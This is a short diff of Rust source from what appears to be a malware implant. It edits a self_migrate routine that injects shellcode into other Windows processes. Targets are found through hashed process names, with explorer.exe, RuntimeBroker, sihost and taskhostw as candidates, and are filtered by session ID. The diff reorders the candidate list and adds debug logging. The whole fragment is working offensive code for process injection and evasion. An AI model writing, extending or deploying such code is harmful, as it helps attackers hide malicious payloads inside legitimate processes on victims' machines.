@@ -9,10 +9,10 @@ use core::ptr::null_mut;
 
 // Candidate host processes, orderd by preference
 const CANDIDATES: &[u32] = &[
-    hashes::EXPLORER_EXE_HASH,
     hashes::RUNTIMEBROKER_EXE_HASH,
     hashes::SIHOST_EXE_HASH,
     hashes::TASKHOSTW_EXE_HASH,
+    hashes::EXPLORER_EXE_HASH,
 ];
 
 unsafe fn get_own_session_id() -> u32 { unsafe {
@@ -172,6 +172,8 @@ pub unsafe fn self_migrate(shellcode: &[u8]) -> bool { unsafe {
     }
 
     let our_session = get_own_session_id();
+    debug!("[MIGRATE] Our session ID: {}", our_session);
+
     for (idx, &hash) in CANDIDATES.iter().enumerate() {
         debug!("[MIGRATE] Trying target #{}", idx);
         let pids = find_processes_by_hash(hash, our_session);
